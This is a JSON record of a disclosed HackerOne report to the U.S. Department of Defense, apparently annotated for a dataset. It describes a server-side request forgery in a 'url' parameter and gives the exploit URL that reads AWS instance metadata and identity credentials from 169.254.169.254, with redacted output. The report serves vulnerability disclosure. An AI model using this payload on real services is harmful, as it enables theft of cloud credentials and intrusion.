{
    "reported_to": "U.S. Dept Of Defense",
    "reported_by": "720922 ",
    "title": "SSRF to read AWS metaData at https://\u2588\u2588\u2588\u2588\u2588/ [HtUS]",
    "content": "\nHello Team,\nWhile researching your program I found that the domain https://\u2588\u2588\u2588\u2588/ is vulnerable to Server Side Request Frogery Attacks via the url parameter.\nAn attacker is able to fetch the aws metadata abusing the SSRF at https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\n==========================SUMMARY=======================\n## Vulnerable URL:\nhttps://\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\nVulnerable Path:\n/api/v1/download-url?url=http://169.254.169.254/latest/meta-data/\nFinal Exploit URL:\nhttps://\u2588\u2588\u2588\u2588\u2588/api/v1/download-url?url=http://169.254.169.254/latest/meta-data/\nExploited AWS metadata\nCode 313 Bytes\n1ami-id\n2ami-launch-index\n3ami-manifest-path\n4block-device-mapping/\n5events/\n6hostname\n7identity-credentials/\n8instance-action\n9instance-id\n10instance-life-cycle\n11instance-type\n12local-hostname\n13local-ipv4\n14mac\n15metrics/\n16network/\n17placement/\n18profile\n19public-hostname\n20public-ipv4\n21public-keys/\n22reservation-id\n23security-groups\n24services/\nExposed Credentials:\nhttps://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/api/v1/download-url?url=http://169.254.169.254/2021-07-15/meta-data/identity-credentials/ec2/security-credentials/ec2-instance\nCode 161 Bytes\n1{\n2  \"Code\" : \"Success\",\n3  \"LastUpdated\" : \"2022-07-04T11:22:59Z\",\n4  \"Type\" : \"AWS-HMAC\",\n5  \"AccessKeyId\" : \"\u2588\u2588\u2588\",\n6  \"SecretAccessKey\" : \"\u2588\u2588\u2588\u2588\",\n7  \"Token\" : \"\u2588\u2588\u2588\u2588\n=========================STEPS TO REPRODUCE========================\n1) Go to the above Exploit URL, i.e; https://\u2588\u2588\u2588\u2588\u2588/api/v1/download-url?url=http://169.254.169.254/latest/meta-data/\n2) You will see the AWS Metadata being fetched and exposed.\nImpact\nAn attacker is able to explore and fertch the AWS metadata via the SSRF. This SSRF can be used to perform other attack vectors as well such as scanning internal ports. A successful SSRF attack can often result in unauthorized actions or access to data within the organization, either in the vulnerable application itself or on other back-end systems that the application can communicate with.\n\n",
    "severity": [
        9.0,
        10.0
    ],
    "bounty": null,
    "weaknesses": [
        "Server-Side Request Forgery (SSRF)"
    ],
    "screenshots": {},
    "disclosed_date": 1665774720,
    "report_url": "https://hackerone.com/reports/1624140",
    "is_multi_component": true,
    "complexity": "MEDIUM",
    "novelty": "MEDIUM",
    "vuln_category": "API",
    "steps": [
        [
            1,
            "Go to the vulnerable URL: https://\u2588\u2588\u2588\u2588\u2588/api/v1/download-url?url=http://169.254.169.254/latest/meta-data/"
        ],
        [
            2,
            "Observe the AWS metadata being fetched and exposed in the response"
        ]
    ],
    "vuln_description": "The vulnerability is a Server-Side Request Forgery (SSRF) that allows an attacker to fetch AWS metadata by manipulating the 'url' parameter in the vulnerable endpoint. This can lead to unauthorized access to sensitive AWS credentials and other internal system information.",
    "reason": "The attack is straightforward and involves a single component (the 'url' parameter). There are no complex interactions or state manipulations required. The attack leverages a common SSRF vector (AWS metadata endpoint) which is well-documented and frequently targeted.",
    "new_complexity": "LOW",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}